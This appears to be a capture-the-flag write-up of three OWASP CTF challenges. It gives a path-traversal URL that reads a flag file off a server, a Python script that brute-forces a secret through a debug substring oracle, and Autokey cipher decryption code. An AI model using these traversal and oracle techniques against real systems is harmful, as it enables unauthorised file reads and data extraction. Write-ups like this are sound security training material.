# owasp-final-ctf-writeups
### Valentin Buza

## Silent Speaker

Path traversal using the 'file' argument.

Flag is at ```https://141.85.224.109/index.php?file=../../../../home/ctf/flag```.

## Flag Helper

Use debug messages to brute force one character at a time.

```
import requests
import string

def oracle(s):
	r = requests.get('http://141.85.224.107:31337/debug', params={'substring': s}).content
	return r == 'TRUE'

flag = 'OWASPCTF{'

done = False
while not done:
	done = True
	for c in string.printable:
		if oracle(flag+c):
			flag += c
			print flag
			done = False
```

## Latin

Use AutoKey Cipher.

```
from pycipher import Autokey

ct = 'jegwcgkjdagarwfqzithglvjgimmfmiivtrcysmigizmaazxccthrvjgjzkwvrsioekiahfronuvtikxjugormkmiwceftwpvolseqrx'

# find clue #1, 'VIGENERE'
print Autokey('OWASPCTF').decipher(ct)

# find clue #2, 'OWASPCTFVIGENERE'
print Autokey('VIGENEREISAWESOME').decipher(ct)

# find message
print Autokey('OWASPCTF'+'VIGENERE'*12).decipher(ct)

```
